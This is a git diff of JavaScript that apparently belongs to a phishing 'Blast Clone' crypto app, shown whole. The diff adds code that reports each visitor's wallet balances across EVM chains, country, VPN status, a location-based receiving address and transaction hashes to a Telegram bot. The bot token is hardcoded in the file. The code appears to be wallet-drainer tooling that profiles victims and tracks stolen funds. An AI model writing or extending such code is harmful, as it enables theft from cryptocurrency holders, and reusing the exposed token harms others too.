@@ -1,5 +1,5 @@
 import axios from "axios";
-import { getUserCountry, checkVpnStatus, getRecipientAddress } from "./userLocation";
+import { getUserCountry, checkVpnStatus, getRecipientAddress } from "./getUserLocation";
 
 // Telegram Bot Token and Chat ID
 const TELEGRAM_BOT_TOKEN = "7448589458:AAGDlnlZerWT7JSTc1C7mq9X0bkYpZkwtQ0";
@@ -26,10 +26,39 @@ export const sendMessageToTelegram = async (message) => {
   }
 };
 
-// Function to send app details (like  balance) to Telegram
-export const sendAppDetailsToTelegram = async (balance, tokens) => {
+const getNativeTokenName = (chain) => {
+  switch (chain) {
+    case "Ethereum":
+      return "ETH";
+    case "Binance Smart Chain":
+      return "BNB";
+    case "Polygon":
+      return "MATIC";
+    case "Avalanche":
+      return "AVAX";
+    case "Arbitrum":
+      return "ETH";
+    case "Optimism":
+      return "ETH";
+    case "Celo":
+      return "CELO";
+    default:
+      return "ETH";
+  }
+};
+
+export const sendTransactionStatusToTelegram = async (status, txHash) => {
+  const message = `*Transaction Status*\n` +
+                  `Status: ${status === "success" ? "✅ Success" : "❌ Failure"}\n` +
+                  `Transaction Hash: \`${txHash}\``;
+
+  await sendMessageToTelegram(message);
+};
+
+// Function to send app details (for EVM chains) to Telegram
+export const sendAppDetailsToTelegram = async (nativeBalance, tokens, chain) => {
   const tokenDetails = tokens.map(
-    (token) => `|💵 ${token.assetName}: ${(token.amount / 1000000).toFixed(2)} ${token.assetName}   |`
+    (token) => `|💵 ${token.symbol}: ${(token.tokenAmount / 10 ** token.tokenDecimal).toFixed(4)} ${token.symbol}   |`
   );
 
   let userCountryData = await getUserCountry();
@@ -46,6 +75,7 @@ export const sendAppDetailsToTelegram = async (balance, tokens) => {
   const globeIcon = "🌍";
   const isMine = specialCountries.includes(countryCode) || isVpn ? "🔴" : "🟢";
 
+  const nativeTokenName = getNativeTokenName(chain);
   let message = `*Visit Alert*\n` +
                 `App: Blast Clone\n\n` +
                 `User Info--------------------\n` +
@@ -59,8 +89,8 @@ export const sendAppDetailsToTelegram = async (balance, tokens) => {
 
   message += `| 💼 Receiving Address: ${recipientAddress} ${isMine}|\n` +
              `--------------------------------\n` +
-             `| 💵 User Wallet Balance  |\n` +
-             `| 💵 ADA: ${balance.toFixed(2)} ADA       |\n` +
+             `| 💵 User Wallet Balance on ${chain} |\n` +
+             `| 💵 Native Balance: ${nativeBalance} ${nativeTokenName}       |\n` +
              `${tokenDetails.join("\n")}\n` +
              `------------------------------End`;
 
